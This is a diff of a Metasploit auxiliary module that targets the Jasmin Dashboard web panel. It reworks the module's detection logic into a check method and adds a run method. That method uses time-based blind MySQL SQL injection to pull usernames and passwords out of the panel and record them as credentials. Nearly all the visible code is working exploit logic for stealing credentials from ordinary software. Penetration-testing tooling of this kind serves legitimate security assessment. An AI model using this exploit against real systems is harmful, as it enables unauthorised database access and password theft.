@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::SQLi
-  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(
@@ -49,13 +48,17 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def run_host(ip)
+  def check
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path)
     )
+    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
+    return Exploit::CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200
 
-    fail_with(Failure::NotFound, 'Check TARGETURI, Jasmin Dashboard not detected') unless res.body.include? '<title>Jasmin Dashboard</title>'
+    Exploit::CheckCode::Detected('Jasmin Login page detected') if res.body.include? '<title>Jasmin Dashboard</title>'
+  end
 
+  def run
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
       check_char = Rex::Text.rand_text_alpha_lower(5)
       res = send_request_cgi({
@@ -88,7 +91,7 @@ class MetasploitModule < Msf::Auxiliary
         private_type: :password,
         private_data: user[1],
         service_name: 'Jasmin Webpanel',
-        address: ip,
+        address: datastore['RHOST'],
         port: datastore['RPORT'],
         protocol: 'tcp',
         status: Metasploit::Model::Login::Status::UNTRIED
